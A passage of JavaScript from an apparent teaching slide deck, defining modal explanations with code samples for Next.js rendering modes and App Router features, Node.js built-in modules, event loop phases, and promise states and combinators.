    paths: posts.map(p => ({ params: { slug: p.slug } })),
    fallback: false
  };
}

export async function getStaticProps({ params }) {
  const post = await getPost(params.slug);
  return { props: { post } };
}

// App Router equivalent
// app/blog/[slug]/page.js
export async function generateStaticParams() {
  const posts = await getAllPosts();
  return posts.map(p => ({ slug: p.slug }));
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use SSG</div>
                        <ul>
                            <li><strong>Marketing pages</strong> — content rarely changes</li>
                            <li><strong>Blog posts</strong> — published content is static</li>
                            <li><strong>Documentation</strong> — versioned, infrequent updates</li>
                            <li><strong>E-commerce product pages</strong> — with ISR for updates</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Pros & Cons</div>
                        <p><strong>✅ Pros:</strong> Fastest TTFB, CDN-cacheable, zero server cost at runtime</p>
                        <p><strong>❌ Cons:</strong> Stale until rebuild, build time grows with pages</p>
                    </div>
                `
            },
            'render-ssr': {
                title: 'Server-Side Rendering (SSR)',
                body: `
                    <p><strong>SSR</strong> generates HTML on <strong>every request</strong> — always fresh data.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// pages/dashboard.js (Pages Router)
export async function getServerSideProps(context) {
  const { req, res, query } = context;
  const user = await getUser(req.cookies.token);
  const data = await fetchDashboardData(user.id);

  return {
    props: { user, data }
  };
}

// App Router equivalent
// app/dashboard/page.js
export const dynamic = 'force-dynamic';

async function DashboardPage() {
  const user = await getUser();
  const data = await fetchDashboardData(user.id);
  return <Dashboard user={user} data={data} />;
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use SSR</div>
                        <ul>
                            <li><strong>User dashboards</strong> — personalized, real-time data</li>
                            <li><strong>Search results</strong> — query-dependent content</li>
                            <li><strong>Auth-protected pages</strong> — user-specific content</li>
                            <li><strong>Real-time feeds</strong> — frequently changing data</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Pros & Cons</div>
                        <p><strong>✅ Pros:</strong> Always fresh, SEO-friendly, access to request context</p>
                        <p><strong>❌ Cons:</strong> Slower TTFB, server compute cost, can't cache at CDN edge</p>
                    </div>
                `
            },
            'render-isr': {
                title: 'Incremental Static Regeneration (ISR)',
                body: `
                    <p><strong>ISR</strong> combines SSG speed with SSR freshness — <strong>best of both worlds</strong>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// pages/products/[id].js (Pages Router)
export async function getStaticProps({ params }) {
  const product = await getProduct(params.id);
  return {
    props: { product },
    revalidate: 60  // Regenerate every 60 seconds
  };
}

// App Router equivalent
// app/products/[id]/page.js
export const revalidate = 60; // seconds

async function ProductPage({ params }) {
  const product = await getProduct(params.id);
  return <ProductDetails product={product} />;
}

// On-demand revalidation (API route)
// app/api/revalidate/route.js
import { revalidatePath, revalidateTag } from 'next/cache';

export async function POST(request) {
  revalidatePath('/products/123');
  revalidateTag('products');
  return Response.json({ revalidated: true });
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">How ISR Works</div>
                        <ol>
                            <li>First request serves cached static page</li>
                            <li>After <code>revalidate</code> period, next request triggers background regeneration</li>
                            <li>Once regenerated, new version is served to subsequent requests</li>
                            <li>Stale-while-revalidate pattern — users never wait for regeneration</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Pros & Cons</div>
                        <p><strong>✅ Pros:</strong> Fast like SSG, fresh within revalidate window, scales infinitely</p>
                        <p><strong>❌ Cons:</strong> Data can be stale up to revalidate seconds, complexity</p>
                    </div>
                `
            },
            'render-csr': {
                title: 'Client-Side Rendering (CSR)',
                body: `
                    <p><strong>CSR</strong> renders entirely in the browser — server sends minimal HTML shell.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Traditional React SPA approach
'use client';

import { useState, useEffect } from 'react';

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch(\`/api/users/\${userId}\`)
      .then(res => res.json())
      .then(data => {
        setUser(data);
        setLoading(false);
      });
  }, [userId]);

  if (loading) return <Skeleton />;
  return <ProfileCard user={user} />;
}

// Modern approach: React Query / SWR
import useSWR from 'swr';

function UserProfile({ userId }) {
  const { data, error, isLoading } = useSWR(
    \`/api/users/\${userId}\`,
    fetcher
  );
  // Automatic caching, revalidation, error handling
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use CSR</div>
                        <ul>
                            <li><strong>Interactive dashboards</strong> — heavy client-side interactions</li>
                            <li><strong>Real-time apps</strong> — chat, collaboration tools</li>
                            <li><strong>Authenticated sections</strong> — no SEO needed</li>
                            <li><strong>Data that updates frequently</strong> — live feeds, notifications</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Pros & Cons</div>
                        <p><strong>✅ Pros:</strong> Rich interactivity, real-time updates, reduced server load</p>
                        <p><strong>❌ Cons:</strong> Poor SEO, slower initial load, loading spinners everywhere</p>
                    </div>
                `
            },
            // Next.js App Router Features (Slide 30)
            'feature-rsc': {
                title: 'React Server Components (RSC)',
                body: `
                    <p><strong>Server Components</strong> run only on the server — zero JavaScript sent to the client!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// app/products/page.js — Server Component (default)
async function ProductsPage() {
  // This runs on the server only
  const products = await db.query('SELECT * FROM products');

  return (
    <div>
      <h1>Products</h1>
      {products.map(p => (
        <ProductCard key={p.id} product={p} />
      ))}
      <AddToCartButton /> {/* Client Component */}
    </div>
  );
}

// components/AddToCartButton.js — Client Component
'use client';

import { useState } from 'react';

export function AddToCartButton({ productId }) {
  const [added, setAdded] = useState(false);
  // useState, useEffect, event handlers work here
  return <button onClick={() => setAdded(true)}>Add</button>;
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Server vs Client Components</div>
                        <table style="width: 100%; border-collapse: collapse; font-size: 0.9em;">
                            <tr style="border-bottom: 1px solid var(--bg-tertiary);">
                                <th style="text-align: left; padding: 0.5rem;">Feature</th>
                                <th style="text-align: center; padding: 0.5rem;">Server</th>
                                <th style="text-align: center; padding: 0.5rem;">Client</th>
                            </tr>
                            <tr><td style="padding: 0.5rem;">fetch data</td><td style="text-align: center;">✅</td><td style="text-align: center;">✅</td></tr>
                            <tr><td style="padding: 0.5rem;">Access backend</td><td style="text-align: center;">✅</td><td style="text-align: center;">❌</td></tr>
                            <tr><td style="padding: 0.5rem;">useState/useEffect</td><td style="text-align: center;">❌</td><td style="text-align: center;">✅</td></tr>
                            <tr><td style="padding: 0.5rem;">Event handlers</td><td style="text-align: center;">❌</td><td style="text-align: center;">✅</td></tr>
                            <tr><td style="padding: 0.5rem;">JS bundle size</td><td style="text-align: center;">0 KB</td><td style="text-align: center;">+ size</td></tr>
                        </table>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Benefits</div>
                        <p><strong>Smaller bundles</strong> — server code never ships to browser. <strong>Direct data access</strong> — no API layer needed. <strong>Secure</strong> — secrets stay on server.</p>
                    </div>
                `
            },
            'feature-layouts': {
                title: 'Nested Layouts',
                body: `
                    <p><strong>Nested Layouts</strong> persist across navigations — no re-rendering shared UI!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>app/
├── layout.js          // Root layout (nav, footer)
├── page.js            // Home page
├── dashboard/
│   ├── layout.js      // Dashboard layout (sidebar)
│   ├── page.js        // /dashboard
│   ├── settings/
│   │   └── page.js    // /dashboard/settings
│   └── analytics/
│       └── page.js    // /dashboard/analytics

// app/layout.js — Root layout
export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        <Navbar />        {/* Persists across ALL pages */}
        {children}
        <Footer />
      </body>
    </html>
  );
}

// app/dashboard/layout.js — Dashboard layout
export default function DashboardLayout({ children }) {
  return (
    <div className="dashboard">
      <Sidebar />       {/* Persists across dashboard pages */}
      <main>{children}</main>
    </div>
  );
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">How Nesting Works</div>
                        <p>Navigating from <code>/dashboard/settings</code> to <code>/dashboard/analytics</code>:</p>
                        <ul>
                            <li>Root layout: <strong>preserved</strong> (no re-render)</li>
                            <li>Dashboard layout: <strong>preserved</strong> (sidebar stays)</li>
                            <li>Page content: <strong>swapped</strong> (only this changes)</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Benefits</div>
                        <p><strong>Performance</strong> — shared UI doesn't re-render. <strong>State preservation</strong> — sidebar scroll position, form state persists. <strong>Colocated code</strong> — layout lives with its routes.</p>
                    </div>
                `
            },
            'feature-loading': {
                title: 'Loading States',
                body: `
                    <p><strong>loading.js</strong> creates instant loading UI while the page loads — automatic Suspense!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>app/
├── dashboard/
│   ├── loading.js     // Shows while page.js loads
│   ├── page.js        // Async page with data fetching
│   └── analytics/
│       ├── loading.js // Shows while analytics loads
│       └── page.js

// app/dashboard/loading.js
export default function DashboardLoading() {
  return (
    <div className="dashboard-skeleton">
      <Skeleton width="100%" height={200} />
      <div className="grid">
        <Skeleton width="100%" height={150} />
        <Skeleton width="100%" height={150} />
        <Skeleton width="100%" height={150} />
      </div>
    </div>
  );
}

// Under the hood, Next.js wraps your page:
<Suspense fallback={<DashboardLoading />}>
  <DashboardPage />
</Suspense></code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Instant Navigation</div>
                        <p>When navigating to a route with <code>loading.js</code>:</p>
                        <ol>
                            <li>Navigation starts <strong>immediately</strong></li>
                            <li>Loading UI shows <strong>instantly</strong></li>
                            <li>Page streams in when ready</li>
                            <li>No blank screens, no spinners blocking interaction</li>
                        </ol>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Best Practices</div>
                        <p><strong>Skeleton loaders</strong> — match the layout of actual content. <strong>Granular loading</strong> — use Suspense boundaries for partial loading. <strong>Shared layouts</strong> — layouts render immediately, only page content loads.</p>
                    </div>
                `
            },
            'feature-streaming': {
                title: 'Streaming SSR',
                body: `
                    <p><strong>Streaming</strong> sends HTML progressively — users see content as it renders!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Without streaming: wait for everything
Server: [====== render all ======] → send HTML → Browser shows page

// With streaming: progressive rendering
Server: [header] → send → [content] → send → [footer] → send
Browser:  show↗      show↗       show↗

// How it works with Suspense
async function Page() {
  return (
    <div>
      <Header />           {/* Streams immediately */}
      <Suspense fallback={<LoadingPosts />}>
        <SlowPosts />      {/* Streams when ready */}
      </Suspense>
      <Suspense fallback={<LoadingComments />}>
        <SlowerComments /> {/* Streams when ready */}
      </Suspense>
    </div>
  );
}

// Timeline:
// 0ms:   Header streams to browser
// 100ms: SlowPosts ready, streams + replaces skeleton
// 500ms: SlowerComments ready, streams + replaces skeleton</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why Streaming Matters</div>
                        <ul>
                            <li><strong>Faster TTFB</strong> — first byte arrives immediately</li>
                            <li><strong>Better perceived performance</strong> — content appears progressively</li>
                            <li><strong>Improved Core Web Vitals</strong> — LCP can happen earlier</li>
                            <li><strong>No waterfalls</strong> — slow components don't block fast ones</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Technical Details</div>
                        <p>Uses HTTP chunked transfer encoding. Each Suspense boundary is a chunk. Browser's streaming HTML parser renders chunks as they arrive. Works with React 18's renderToPipeableStream.</p>
                    </div>
                `
            },
            'feature-parallel': {
                title: 'Parallel Routes',
                body: `
                    <p><strong>Parallel Routes</strong> render multiple pages in the same layout simultaneously!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Folder structure with @slots
app/
├── layout.js
├── page.js
├── @analytics/        // Slot: analytics
│   ├── page.js
│   └── loading.js
├── @team/            // Slot: team
│   ├── page.js
│   └── loading.js
└── @notifications/   // Slot: notifications
    ├── page.js
    └── default.js

// app/layout.js — receives slots as props
export default function DashboardLayout({
  children,           // Main content
  analytics,          // @analytics slot
  team,               // @team slot
  notifications       // @notifications slot
}) {
  return (
    <div className="dashboard-grid">
      <main>{children}</main>
      <aside className="right-panel">
        {analytics}
        {team}
      </aside>
      <div className="notifications-tray">
        {notifications}
      </div>
    </div>
  );
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Use Cases</div>
                        <ul>
                            <li><strong>Dashboards</strong> — independent widgets loading in parallel</li>
                            <li><strong>Modals</strong> — modal content as a parallel route with its own URL</li>
                            <li><strong>Split views</strong> — email list + email detail side by side</li>
                            <li><strong>Conditional slots</strong> — show different content based on auth state</li>
                        </ul>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Features</div>
                        <p><strong>Independent loading</strong> — each slot has its own loading.js. <strong>Independent errors</strong> — slot errors don't crash the page. <strong>URL state</strong> — slots can have their own navigation. <strong>default.js</strong> — fallback when slot has no matching content.</p>
                    </div>
                `
            },
            // Node.js Built-in Modules
            'module-fs': {
                title: 'fs — File System Module',
                body: `
                    <p>The <strong>fs</strong> module provides an API for interacting with the file system.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const fs = require('fs');
const fsPromises = require('fs/promises');

// Read file (async with promises)
const data = await fsPromises.readFile('config.json', 'utf8');
const config = JSON.parse(data);

// Write file
await fsPromises.writeFile('output.txt', 'Hello World');

// Check if file exists
const exists = fs.existsSync('myfile.txt');

// Read directory
const files = await fsPromises.readdir('./src');

// Watch for changes
fs.watch('./src', (eventType, filename) => {
    console.log(\`\${filename} changed: \${eventType}\`);
});

// Create read stream (memory efficient for large files)
const stream = fs.createReadStream('large.log');</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Methods</div>
                        <ul>
                            <li><code>readFile/writeFile</code> — read/write entire files</li>
                            <li><code>mkdir/rmdir</code> — create/remove directories</li>
                            <li><code>stat</code> — get file metadata (size, modified date)</li>
                            <li><code>createReadStream/createWriteStream</code> — streaming I/O</li>
                        </ul>
                    </div>
                `
            },
            'module-path': {
                title: 'path — Path Manipulation',
                body: `
                    <p>The <strong>path</strong> module handles file paths in a cross-platform way.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const path = require('path');

// Join path segments (handles / vs \\ automatically)
const fullPath = path.join(__dirname, 'data', 'users.json');
// → /app/data/users.json (Unix) or C:\\app\\data\\users.json (Windows)

// Get parts of a path
path.dirname('/app/data/file.txt');   // → '/app/data'
path.basename('/app/data/file.txt');  // → 'file.txt'
path.extname('/app/data/file.txt');   // → '.txt'

// Resolve to absolute path
path.resolve('src', 'index.js');  // → /current/working/dir/src/index.js

// Parse path into components
path.parse('/home/user/file.txt');
// { root: '/', dir: '/home/user', base: 'file.txt', ext: '.txt', name: 'file' }

// Normalize messy paths
path.normalize('/foo/bar//baz/asdf/quux/..');  // → '/foo/bar/baz/asdf'</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Why Use path?</div>
                        <p>Never concatenate paths with <code>+</code> or template literals! Windows uses <code>\\</code>, Unix uses <code>/</code>. The path module handles this automatically.</p>
                    </div>
                `
            },
            'module-http': {
                title: 'http — HTTP Server & Client',
                body: `
                    <p>The <strong>http</strong> module creates HTTP servers and makes HTTP requests.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const http = require('http');

// Create HTTP server
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));
});
server.listen(3000);

// Make HTTP request (prefer fetch in modern Node)
http.get('http://api.example.com/data', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => console.log(JSON.parse(data)));
});

// Modern way: use built-in fetch (Node 18+)
const response = await fetch('http://api.example.com/data');
const data = await response.json();</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Note</div>
                        <p>For production servers, use Express, Fastify, or Hono — they add routing, middleware, and convenience methods. Raw http module is mostly for learning or very custom needs.</p>
                    </div>
                `
            },
            'module-net': {
                title: 'net — TCP Networking',
                body: `
                    <p>The <strong>net</strong> module provides low-level TCP and IPC networking.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const net = require('net');

// TCP Server
const server = net.createServer((socket) => {
    socket.on('data', (data) => {
        socket.write('Received: ' + data);
    });
});
server.listen(8080);

// TCP Client
const client = net.createConnection({ port: 8080 }, () => {
    client.write('Hello server!');
});
client.on('data', (data) => console.log(data.toString()));

// IPC (Inter-Process Communication) via Unix socket
const ipcServer = net.createServer((socket) => { ... });
ipcServer.listen('/tmp/my-app.sock');</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Use Cases</div>
                        <ul>
                            <li><strong>Custom protocols</strong> — implement protocols not based on HTTP</li>
                            <li><strong>Game servers</strong> — low-latency bidirectional communication</li>
                            <li><strong>IoT devices</strong> — lightweight TCP connections</li>
                            <li><strong>IPC</strong> — fast communication between processes</li>
                        </ul>
                    </div>
                `
            },
            'module-crypto': {
                title: 'crypto — Cryptography',
                body: `
                    <p>The <strong>crypto</strong> module provides cryptographic functionality.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const crypto = require('crypto');

// Hashing (one-way, for checksums/passwords)
const hash = crypto.createHash('sha256')
    .update('data to hash')
    .digest('hex');

// HMAC (keyed hashing for message authentication)
const hmac = crypto.createHmac('sha256', 'secret-key')
    .update('message')
    .digest('hex');

// Secure random values
const token = crypto.randomBytes(32).toString('hex');
const uuid = crypto.randomUUID();

// Password hashing (use bcrypt/argon2 in production)
const salt = crypto.randomBytes(16).toString('hex');
const derived = crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512');</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Security Note</div>
                        <p>For password storage, use <code>bcrypt</code> or <code>argon2</code> instead of raw crypto. They include salting and are designed to be slow (resistant to brute force).</p>
                    </div>
                `
            },
            'module-events': {
                title: 'events — EventEmitter',
                body: `
                    <p>The <strong>events</strong> module provides the EventEmitter class — the foundation of Node's event-driven architecture.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const EventEmitter = require('events');

// Create custom event emitter
class OrderService extends EventEmitter {
    placeOrder(order) {
        // ... process order
        this.emit('orderPlaced', order);
        this.emit('inventory:update', order.items);
    }
}

const orders = new OrderService();

// Listen for events
orders.on('orderPlaced', (order) => {
    console.log('New order:', order.id);
    sendConfirmationEmail(order);
});

orders.once('orderPlaced', () => {
    console.log('First order placed!');  // Only fires once
});

// Many Node APIs are EventEmitters
const server = http.createServer();
server.on('request', handleRequest);
server.on('error', handleError);</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Common Events Pattern</div>
                        <p>Streams, HTTP servers, child processes, and many other Node APIs extend EventEmitter. Understanding this pattern is key to Node development.</p>
                    </div>
                `
            },
            'module-stream': {
                title: 'stream — Streaming Data',
                body: `
                    <p><strong>Streams</strong> handle data piece by piece without loading everything into memory.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const { Readable, Writable, Transform, pipeline } = require('stream');
const fs = require('fs');
const zlib = require('zlib');

// Pipe: connect streams together
fs.createReadStream('input.txt')
    .pipe(zlib.createGzip())
    .pipe(fs.createWriteStream('input.txt.gz'));

// pipeline: better error handling (recommended)
const { promisify } = require('util');
const pipelineAsync = promisify(pipeline);

await pipelineAsync(
    fs.createReadStream('huge.csv'),
    csvParser(),
    transformData(),
    fs.createWriteStream('output.json')
);

// Create custom transform stream
const upperCase = new Transform({
    transform(chunk, encoding, callback) {
        this.push(chunk.toString().toUpperCase());
        callback();
    }
});</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Stream Types</div>
                        <ul>
                            <li><strong>Readable</strong> — source of data (fs.createReadStream)</li>
                            <li><strong>Writable</strong> — destination (fs.createWriteStream)</li>
                            <li><strong>Transform</strong> — modify data (zlib.createGzip)</li>
                            <li><strong>Duplex</strong> — both readable and writable (net.Socket)</li>
                        </ul>
                    </div>
                `
            },
            'module-os': {
                title: 'os — Operating System Info',
                body: `
                    <p>The <strong>os</strong> module provides operating system information and utilities.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const os = require('os');

// System info
os.platform();   // 'darwin', 'linux', 'win32'
os.arch();       // 'x64', 'arm64'
os.release();    // '22.6.0'
os.hostname();   // 'my-macbook'

// CPU info
os.cpus();       // Array of CPU cores with model, speed
os.cpus().length // Number of cores (useful for clustering)

// Memory
os.totalmem();   // Total memory in bytes
os.freemem();    // Available memory

// Paths
os.homedir();    // '/Users/john' or 'C:\\Users\\john'
os.tmpdir();     // '/tmp' or 'C:\\Users\\john\\AppData\\Local\\Temp'

// Network interfaces
os.networkInterfaces();  // { en0: [...], lo0: [...] }

// End-of-line character (cross-platform)
os.EOL;          // '\\n' on Unix, '\\r\\n' on Windows</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Use Cases</div>
                        <p>Useful for: cluster worker count (<code>os.cpus().length</code>), cross-platform scripts, system monitoring, diagnostics.</p>
                    </div>
                `
            },
            // Event Loop phases
            'loop-timers': {
                title: 'Event Loop: Timers Phase',
                body: `
                    <p>The <strong>timers</strong> phase executes callbacks scheduled by <code>setTimeout()</code> and <code>setInterval()</code>.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// These callbacks run in the timers phase
setTimeout(() => {
    console.log('Runs after at least 100ms');
}, 100);

setInterval(() => {
    console.log('Runs every 1 second');
}, 1000);</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Important Note</div>
                        <p>Timers are <strong>not guaranteed</strong> to run exactly when specified. They run <strong>as soon as possible after</strong> the specified time, once the event loop reaches this phase. Heavy I/O or long-running callbacks can delay timers.</p>
                    </div>
                `
            },
            'loop-poll': {
                title: 'Event Loop: Poll Phase',
                body: `
                    <p>The <strong>poll</strong> phase retrieves new I/O events and executes I/O callbacks. This is where Node spends most of its time.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// These callbacks run in the poll phase
fs.readFile('file.txt', (err, data) => {
    console.log('File read callback - poll phase');
});

http.get('http://api.example.com', (res) => {
    console.log('HTTP response callback - poll phase');
});

net.createServer((socket) => {
    socket.on('data', (data) => {
        console.log('Socket data callback - poll phase');
    });
});</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Poll Phase Behavior</div>
                        <ul>
                            <li>If there are callbacks in the queue, execute them</li>
                            <li>If no callbacks, wait for I/O events (blocking)</li>
                            <li>If timers are scheduled, loop back to timers phase</li>
                        </ul>
                    </div>
                `
            },
            'loop-check': {
                title: 'Event Loop: Check Phase',
                body: `
                    <p>The <strong>check</strong> phase runs <code>setImmediate()</code> callbacks, immediately after the poll phase.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// setImmediate runs in the check phase
setImmediate(() => {
    console.log('Runs in check phase');
});

// Compare with setTimeout
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));
// Order is non-deterministic when called from main module

// But inside I/O callback, setImmediate always runs first
fs.readFile('file.txt', () => {
    setTimeout(() => console.log('timeout'), 0);
    setImmediate(() => console.log('immediate'));
    // Always prints: immediate, then timeout
});</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use setImmediate</div>
                        <p>Use <code>setImmediate</code> to schedule code after I/O callbacks but before timers. It's useful for breaking up CPU-intensive work to let I/O events through.</p>
                    </div>
                `
            },
            // Promise states
            'promise-pending': {
                title: 'Promise State: Pending',
                body: `
                    <p>A promise is <strong>pending</strong> when the async operation hasn't completed yet.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const promise = fetch('/api/data');
console.log(promise);  // Promise { <pending> }

// The promise is pending until:
// - The network request completes (fulfilled)
// - The network request fails (rejected)
// - A timeout occurs (rejected)

// You cannot synchronously get the value from a pending promise
// You must use .then() or await</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Key Points</div>
                        <ul>
                            <li>All promises start in pending state</li>
                            <li>Pending promises transition to fulfilled OR rejected (never both)</li>
                            <li>Once settled, a promise never changes state again</li>
                        </ul>
                    </div>
                `
            },
            'promise-fulfilled': {
                title: 'Promise State: Fulfilled',
                body: `
                    <p>A promise is <strong>fulfilled</strong> when the async operation completes successfully.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Creating a fulfilled promise
const fulfilled = Promise.resolve('success');
console.log(fulfilled);  // Promise { 'success' }

// A promise fulfills when resolve() is called
new Promise((resolve, reject) => {
    // Async work...
    resolve('Operation completed!');  // → fulfilled
});

// Access the value with .then() or await
const data = await fetchData();  // waits for fulfillment
fetchData().then(data => { ... });  // callback on fulfillment</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Fulfillment Triggers</div>
                        <ul>
                            <li><code>resolve(value)</code> called in executor</li>
                            <li><code>Promise.resolve(value)</code></li>
                            <li><code>async</code> function returns a value</li>
                        </ul>
                    </div>
                `
            },
            'promise-rejected': {
                title: 'Promise State: Rejected',
                body: `
                    <p>A promise is <strong>rejected</strong> when the async operation fails.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Creating a rejected promise
const rejected = Promise.reject(new Error('Failed'));

// A promise rejects when reject() is called or an error is thrown
new Promise((resolve, reject) => {
    reject(new Error('Something went wrong'));  // → rejected
});

new Promise(() => {
    throw new Error('Oops');  // Also rejects!
});

// Handle rejections with .catch() or try/catch
fetchData()
    .catch(err => console.error('Failed:', err));

try {
    await fetchData();
} catch (err) {
    console.error('Failed:', err);
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Unhandled Rejections</div>
                        <p>Always handle rejections! Unhandled promise rejections cause warnings (and in newer Node versions, can crash your app).</p>
                    </div>
                `
            },
            // Promise combinators
            'combinator-all': {
                title: 'Promise.all()',
                body: `
                    <p><strong>Promise.all()</strong> waits for ALL promises to fulfill. Rejects immediately if ANY promise rejects.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Run multiple async operations in parallel
const [users, posts, comments] = await Promise.all([
    fetchUsers(),     // 200ms
    fetchPosts(),     // 300ms
    fetchComments()   // 150ms
]);
// Total time: 300ms (slowest), not 650ms (sum)

// Fail-fast behavior
Promise.all([
    Promise.resolve(1),
    Promise.reject(new Error('Failed!')),  // ← rejects
    Promise.resolve(3)
]).catch(err => {
    console.log(err.message);  // 'Failed!'
    // Other promises are ignored (but still run!)
});</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use</div>
                        <p>Use when you need ALL results and want fast failure. If one failure shouldn't affect others, use <code>Promise.allSettled()</code> instead.</p>
                    </div>
                `
            },
            'combinator-allsettled': {
                title: 'Promise.allSettled()',
                body: `
                    <p><strong>Promise.allSettled()</strong> waits for ALL promises to settle (fulfill or reject). Never short-circuits.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>const results = await Promise.allSettled([
    fetchUser(1),      // succeeds
    fetchUser(999),    // fails (user not found)
    fetchUser(3)       // succeeds
]);

// results = [
//   { status: 'fulfilled', value: { id: 1, name: 'Alice' } },
//   { status: 'rejected', reason: Error('Not found') },
//   { status: 'fulfilled', value: { id: 3, name: 'Charlie' } }
// ]

// Process results
const successful = results
    .filter(r => r.status === 'fulfilled')
    .map(r => r.value);

const failed = results
    .filter(r => r.status === 'rejected')
    .map(r => r.reason);</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use</div>
                        <p>Use when you want to handle each result independently, and failures shouldn't prevent other operations from completing.</p>
                    </div>
                `
            },
            'combinator-race': {
                title: 'Promise.race()',
                body: `
                    <p><strong>Promise.race()</strong> returns the first promise to settle (fulfill OR reject).</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Timeout pattern
const result = await Promise.race([
    fetch('/api/slow-endpoint'),
    new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Timeout')), 5000)
    )
]);

// First CDN to respond wins
const data = await Promise.race([
    fetch('https://cdn1.example.com/data.json'),
    fetch('https://cdn2.example.com/data.json'),
    fetch('https://cdn3.example.com/data.json')
]);

// Note: "losing" promises still complete!
// They're just ignored, not cancelled</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">When to Use</div>
                        <p>Timeouts, racing redundant requests, getting the fastest response from multiple sources.</p>
                    </div>
                `
            },
            'combinator-any': {
                title: 'Promise.any()',
                body: `
                    <p><strong>Promise.any()</strong> returns the first promise to FULFILL. Only rejects if ALL promises reject.</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// Get data from fastest working mirror
const data = await Promise.any([
    fetch('https://mirror1.example.com/data'),  // might fail
    fetch('https://mirror2.example.com/data'),  // might fail
    fetch('https://mirror3.example.com/data')   // might fail
]);
// Returns first successful response, ignores failures

// If ALL reject, throws AggregateError
try {
    await Promise.any([
        Promise.reject(new Error('A failed')),
        Promise.reject(new Error('B failed')),
        Promise.reject(new Error('C failed'))
    ]);
} catch (err) {
    console.log(err.errors);  // Array of all rejection reasons
}</code></pre>
                    </div>
                    <div class="modal-section">
                        <div class="modal-section-title">Promise.any vs Promise.race</div>
                        <p><code>race</code> settles on first to complete (win or fail). <code>any</code> settles on first to succeed (ignores failures until all fail).</p>
                    </div>
                `
            },
            // Async gotchas
            'gotcha-foreach': {
                title: 'forEach Doesn\'t Await',
                body: `
                    <p><code>forEach</code> doesn't wait for async callbacks — it fires all of them immediately!</p>
                    <div class="modal-code-block">
                        <pre class="modal-code"><code>// WRONG — forEach ignores the returned promises
const ids = [1, 2, 3, 4, 5];

ids.forEach(async (id) => {
    await processItem(id);  // Fires all at once!
});
